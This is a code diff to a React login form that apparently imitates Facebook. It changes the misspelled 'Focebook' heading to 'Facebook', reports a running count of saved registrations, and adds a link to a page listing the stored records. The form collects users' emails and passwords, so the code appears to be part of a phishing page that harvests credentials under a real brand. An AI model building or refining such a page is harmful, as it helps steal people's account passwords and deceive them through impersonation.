@@ -23,9 +23,11 @@ export default function LoginForm() {
       const data = await response.json()
 
       if (data.success) {
-        alert(`✅ Registro exitoso para: ${email}`)
+        alert(`✅ Registro exitoso! Total registros: ${data.totalRegistros}`)
         setEmail("")
         setPassword("")
+      } else {
+        alert(`❌ Error: ${data.error}`)
       }
     } catch (error) {
       alert('❌ Error de conexión')
@@ -37,7 +39,7 @@ export default function LoginForm() {
   return (
     <div className="w-full max-w-md">
       <div className="text-center mb-8">
-        <h1 className="text-5xl font-bold text-blue-600 tracking-tight">Focebook</h1>
+        <h1 className="text-5xl font-bold text-blue-600 tracking-tight">Facebook</h1>
       </div>
 
       <div className="bg-white rounded-lg shadow-lg p-8">
@@ -89,8 +91,18 @@ export default function LoginForm() {
             type="button"
             className="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded-lg inline-block mx-auto transition-colors"
           >
-            Create new Folebook account
+            Create new FAcebook account
           </button>
+        </div>
+
+        {/* ENLACE PARA VER REGISTROS - NUEVO */}
+        <div className="text-center mt-6 pt-4 border-t border-gray-200">
+          <a 
+            href="/registros" 
+            className="text-blue-600 hover:underline text-sm font-medium inline-flex items-center gap-1"
+          >
+            📊 Ver registros guardados
+          </a>
         </div>
       </div>
 
